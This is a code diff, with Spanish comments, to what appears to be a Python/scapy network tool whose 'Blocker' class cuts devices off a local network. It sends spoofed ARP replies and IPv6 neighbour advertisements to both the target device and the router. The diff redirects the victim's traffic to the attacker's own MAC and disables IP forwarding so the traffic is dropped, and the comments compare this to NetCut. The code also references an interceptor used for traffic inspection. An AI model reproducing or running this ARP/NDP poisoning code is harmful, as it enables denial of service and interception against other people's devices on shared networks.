@@ -361,19 +361,30 @@ class Blocker:
         self.gateway_ip = None
         self.gateway_mac = None
         self.gateway6 = ""      # link-local IPv6 del router (si la red tiene IPv6)
+        self.my_mac = ""
+        self.sink_mac = BLACKHOLE_MAC
         self.iface = None
         self._running = False
         self._thread = None
         self._lock = threading.Lock()
 
     def _setup(self):
-        from scapy.all import conf
+        from scapy.all import conf, get_if_hwaddr
         iface, _out_ip, gw = conf.route.route("0.0.0.0")
         self.iface = iface
         self.gateway_ip = gw
         self.gateway_mac = Interceptor._mac_of(self.gateway_ip)
         if not self.gateway_mac:
             raise RuntimeError("No se pudo resolver la MAC del router.")
+        try:
+            self.my_mac = (get_if_hwaddr(iface) or "").lower()
+        except Exception:
+            self.my_mac = ""
+        # Sumidero del bloqueo: NUESTRA PROPIA MAC. El equipo manda su trafico a
+        # esta PC (que SI existe y responde, asi no re-resuelve al router) y aqui
+        # muere porque no reenviamos. Es lo que hace NetCut y aguanta mucho mejor
+        # que una MAC inexistente. Si no sabemos nuestra MAC, caemos al agujero.
+        self.sink_mac = self.my_mac or BLACKHOLE_MAC
         self.gateway6 = _gateway6()   # '' si la red no tiene IPv6
 
     def _victim6(self, mac):
@@ -388,26 +399,25 @@ class Blocker:
         return _eui64_ll(mac)
 
     def _poison(self, ip, mac):
-        """Envenena en LAS DOS direcciones (agresivo):
-          - al equipo: "el router (gateway_ip) esta en la MAC agujero-negro"
-            -> no puede ENVIAR al router.
-          - al router: "el equipo (ip) esta en la MAC agujero-negro"
-            -> no puede RECIBIR respuestas.
-        La MAC de origen Ethernet se pone igual al agujero negro para que el ARP
-        no lo descarte un equipo que valida la coherencia L2/ARP."""
-        _send_arp(iface=self.iface, ether_src=BLACKHOLE_MAC, op=2,
-                  pdst=ip, hwdst=mac, psrc=self.gateway_ip, hwsrc=BLACKHOLE_MAC)
-        _send_arp(iface=self.iface, ether_src=BLACKHOLE_MAC, op=2,
+        """Envenena en LAS DOS direcciones (agresivo), apuntando a NUESTRA MAC:
+          - al equipo: "el router (gateway_ip) esta en <sink_mac>" -> su trafico
+            a internet viene a esta PC y muere (no reenviamos).
+          - al router: "el equipo (ip) esta en <sink_mac>" -> las respuestas
+            tampoco le llegan.
+        Envenena IPv4 (ARP) e IPv6 (NDP), porque hoy gran parte del trafico
+        (YouTube, Google...) va por IPv6 y ARP no lo toca."""
+        esrc = None if self.sink_mac == self.my_mac else BLACKHOLE_MAC
+        _send_arp(iface=self.iface, ether_src=esrc, op=2,
+                  pdst=ip, hwdst=mac, psrc=self.gateway_ip, hwsrc=self.sink_mac)
+        _send_arp(iface=self.iface, ether_src=esrc, op=2,
                   pdst=self.gateway_ip, hwdst=self.gateway_mac,
-                  psrc=ip, hwsrc=BLACKHOLE_MAC)
-        # IPv6: dile al equipo que el router (su link-local) esta en la MAC
-        # agujero-negro -> su trafico IPv6 a internet se pierde.
+                  psrc=ip, hwsrc=self.sink_mac)
         if self.gateway6:
             v6 = self._victim6(mac)
             if v6:
                 try:
                     _send_na(self.iface, v6, mac, self.gateway6,
-                             BLACKHOLE_MAC, self.gateway6)
+                             self.sink_mac, self.gateway6)
                 except Exception:
                     pass
 
@@ -432,6 +442,12 @@ class Blocker:
             return False
         if not self._running:
             self._setup()
+            # El sumidero somos NOSOTROS: el trafico del equipo llega aqui y debe
+            # MORIR. Si el reenvio de IP estuviera encendido (p.ej. de una
+            # inspeccion previa), lo reenviariamos y no cortaria. Lo apagamos,
+            # salvo que haya una inspeccion activa que lo necesita.
+            if not interceptor.running():
+                disable_ip_forwarding()
             self._running = True
             self._thread = threading.Thread(target=self._loop, daemon=True)
             self._thread.start()
